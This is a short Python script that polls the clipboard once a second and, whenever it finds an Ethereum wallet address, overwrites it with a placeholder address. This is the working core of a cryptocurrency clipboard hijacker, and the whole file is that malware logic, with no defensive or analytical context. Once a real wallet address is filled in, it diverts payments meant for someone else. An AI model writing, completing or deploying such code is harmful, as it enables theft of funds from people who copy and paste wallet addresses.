import time
import pyperclip
import re

# Function to check if the copied text is a Ethereum wallet address
def is_ethereum_address(text):
    # Ethereum wallet addresses start with '0x' and are 42 characters long
    return re.match(r'^0x[a-fA-F0-9]{40}$', text) is not None

# Placeholder string to replace the Ethereum wallet address
replacement_text = "REPLACEMENT_ADDRESS"

# Main loop to continuously monitor the clipboard
while True:
    # Get the current clipboard content
    clipboard_content = pyperclip.paste()

    # Check if the clipboard content is an Ethereum address
    if is_ethereum_address(clipboard_content):
        # Replace the Ethereum address with the placeholder
        pyperclip.copy(replacement_text)
        print("Copied Ethereum address detected. Replaced with:", replacement_text)

    # Sleep for a short duration before checking again
    time.sleep(1)
